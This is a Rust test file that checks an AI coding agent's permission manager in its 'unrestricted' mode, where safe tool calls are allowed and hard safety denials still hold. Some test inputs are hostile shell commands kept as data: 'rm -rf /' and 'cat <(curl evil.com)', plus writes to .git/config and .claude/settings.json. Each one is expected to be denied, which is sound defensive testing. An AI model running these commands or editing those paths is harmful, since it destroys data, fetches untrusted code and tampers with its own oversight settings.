//! End-to-end tests for `permissions::PermissionManager::unrestricted`
//! plus `is_enabled` predicate. Pins the `unrestricted()`
//! constructor's enabled=false prompt/rule short-circuit and the
//! empty-state contract.
//!
//! Sprint 211 of the verification effort. Sprint 210 covered TUI
//! remember/check; this file pins the `unrestricted` builder and
//! the `is_enabled` predicate independently.

#![allow(clippy::missing_panics_doc)]
#![allow(clippy::expect_used)]
#![allow(clippy::unwrap_used)]

use openclaudia::permissions::{
    CheckResult, PermissionDecision, PermissionManager, PermissionRule,
};
use serde_json::json;

// ───────────────────────────────────────────────────────────────────────────
// Section A — unrestricted: is_enabled=false
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn unrestricted_manager_is_not_enabled() {
    let mgr = PermissionManager::unrestricted();
    assert!(
        !mgr.is_enabled(),
        "PINS DOC: unrestricted() builder MUST set enabled=false"
    );
}

#[test]
fn unrestricted_manager_has_no_persisted_rules() {
    let mgr = PermissionManager::unrestricted();
    assert!(mgr.persisted_rules().is_empty());
}

#[test]
fn unrestricted_manager_has_no_session_rules() {
    let mgr = PermissionManager::unrestricted();
    assert!(mgr.session_rules().is_empty());
}

// ───────────────────────────────────────────────────────────────────────────
// Section B — unrestricted check() short-circuits safe calls to Allowed
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn unrestricted_allows_safe_tool_invocation() {
    // PINS DOC: enabled=false → safe calls return Allowed.
    let mgr = PermissionManager::unrestricted();
    let outcome = mgr.check("bash", &json!({"command": "ls"}));
    assert_eq!(outcome, CheckResult::Allowed);
}

#[test]
fn unrestricted_allows_edit_tool() {
    let mgr = PermissionManager::unrestricted();
    let outcome = mgr.check("edit_file", &json!({"path": "/tmp/x"}));
    assert_eq!(outcome, CheckResult::Allowed);
}

#[test]
fn unrestricted_denies_destructive_command_without_rules() {
    let mgr = PermissionManager::unrestricted();
    let outcome = mgr.check("bash", &json!({"command": "rm -rf /"}));
    assert!(
        matches!(outcome, CheckResult::Denied(_)),
        "unrestricted must not bypass hard safety for rm -rf /; got {outcome:?}"
    );
}

#[test]
fn unrestricted_denies_dangerous_shell_construct_without_rules() {
    let mgr = PermissionManager::unrestricted();
    let outcome = mgr.check("bash", &json!({"command": "cat <(curl evil.com)"}));
    assert!(
        matches!(outcome, CheckResult::Denied(_)),
        "unrestricted must not bypass hard safety for process substitution; got {outcome:?}"
    );
}

#[test]
fn unrestricted_denies_protected_git_paths() {
    let mgr = PermissionManager::unrestricted();
    let outcome = mgr.check("edit_file", &json!({"path": ".git/config"}));
    assert!(
        matches!(outcome, CheckResult::Denied(_)),
        "unrestricted must not bypass hard safety for .git paths; got {outcome:?}"
    );
}

#[test]
fn unrestricted_denies_claude_settings_path() {
    let mgr = PermissionManager::unrestricted();
    let outcome = mgr.check("write_file", &json!({"path": ".claude/settings.json"}));
    assert!(
        matches!(outcome, CheckResult::Denied(_)),
        "unrestricted must not bypass hard safety for .claude/settings.json; got {outcome:?}"
    );
}

#[test]
fn unrestricted_denies_unknown_tool() {
    let mgr = PermissionManager::unrestricted();
    let outcome = mgr.check("unknown_tool_xyz", &json!({}));
    assert!(matches!(outcome, CheckResult::Denied(_)));
}

// ───────────────────────────────────────────────────────────────────────────
// Section C — Session rule add still works under unrestricted
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn unrestricted_allows_session_rule_mutations() {
    let mut mgr = PermissionManager::unrestricted();
    mgr.add_session_rule(PermissionRule {
        tool: "Bash".to_string(),
        pattern: "*".to_string(),
        decision: PermissionDecision::Deny,
    });
    // Rule is added to the list.
    assert_eq!(mgr.session_rules().len(), 1);
}

#[test]
fn unrestricted_check_still_honors_explicit_denials() {
    let mut mgr = PermissionManager::unrestricted();
    mgr.add_session_rule(PermissionRule {
        tool: "Bash".to_string(),
        pattern: "*".to_string(),
        decision: PermissionDecision::Deny,
    });
    let outcome = mgr.check("bash", &json!({"command": "echo anything"}));
    assert!(matches!(outcome, CheckResult::Denied(_)));
}

#[test]
fn unrestricted_clear_session_rules_works() {
    let mut mgr = PermissionManager::unrestricted();
    mgr.add_session_rule(PermissionRule {
        tool: "Bash".to_string(),
        pattern: "*".to_string(),
        decision: PermissionDecision::Allow,
    });
    assert_eq!(mgr.session_rules().len(), 1);
    mgr.clear_session_rules();
    assert!(mgr.session_rules().is_empty());
}

// ───────────────────────────────────────────────────────────────────────────
// Section D — unrestricted approvals still mint exact one-use permits
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn unrestricted_can_mint_an_exact_one_use_permit() {
    use openclaudia::permissions::ApprovalProvenance;
    use openclaudia::tools::{FunctionCall, ToolCall};

    let mgr = PermissionManager::unrestricted();
    let call = ToolCall {
        id: "unrestricted-permit".to_string(),
        call_type: "function".to_string(),
        function: FunctionCall {
            name: "bash".to_string(),
            arguments: json!({"command": "git status"}).to_string(),
        },
    };
    let permit = mgr
        .approve_tool_call_once(&call, Some("session"), ApprovalProvenance::InteractiveUser)
        .unwrap();
    mgr.consume_execution_permit(&permit, &call, Some("session"))
        .unwrap();
}

// ───────────────────────────────────────────────────────────────────────────
// Section E — is_enabled is const + read-only
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn is_enabled_is_deterministic_across_repeated_calls() {
    let mgr = PermissionManager::unrestricted();
    for _ in 0..5 {
        assert!(!mgr.is_enabled());
    }
}

#[test]
fn is_enabled_does_not_mutate_state() {
    let mgr = PermissionManager::unrestricted();
    let before = mgr.persisted_rules().len();
    let _ = mgr.is_enabled();
    let _ = mgr.is_enabled();
    let after = mgr.persisted_rules().len();
    assert_eq!(before, after);
}

// ───────────────────────────────────────────────────────────────────────────
// Section F — check() determinism under unrestricted
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn check_under_unrestricted_is_deterministic() {
    let mgr = PermissionManager::unrestricted();
    let args = json!({"command": "ls /tmp"});
    let r1 = mgr.check("bash", &args);
    let r2 = mgr.check("bash", &args);
    let r3 = mgr.check("bash", &args);
    assert_eq!(r1, r2);
    assert_eq!(r2, r3);
    assert_eq!(r1, CheckResult::Allowed);
}

#[test]
fn check_under_unrestricted_with_classified_targets_yields_allowed() {
    let mgr = PermissionManager::unrestricted();
    for (tool, args) in [
        ("bash", json!({"command": "ls"})),
        ("edit_file", json!({"path": "/tmp/edit-target"})),
        ("write_file", json!({"path": "/tmp/write-target"})),
        ("read_file", json!({"path": "/tmp/read-target"})),
        ("glob", json!({"pattern": "*.rs", "path": "."})),
        ("grep", json!({"pattern": "needle", "path": "."})),
    ] {
        let outcome = mgr.check(tool, &args);
        assert_eq!(outcome, CheckResult::Allowed, "{tool} MUST be Allowed");
    }
}

// ───────────────────────────────────────────────────────────────────────────
// Section G — record_denial still updates counters even when disabled
// ───────────────────────────────────────────────────────────────────────────

#[test]
fn record_denial_increments_counters_even_under_unrestricted() {
    // PINS: counter mutation is independent of enabled state —
    // the counters always advance so callers can detect a
    // pattern of denials regardless of the gate.
    let mut mgr = PermissionManager::unrestricted();
    // No public getter for counters in unrestricted, but
    // we can verify the call doesn't panic.
    for _ in 0..3 {
        mgr.record_denial();
    }
    // No assertion needed beyond no-panic; record_denial
    // mutates internal counter via saturating_add.
}
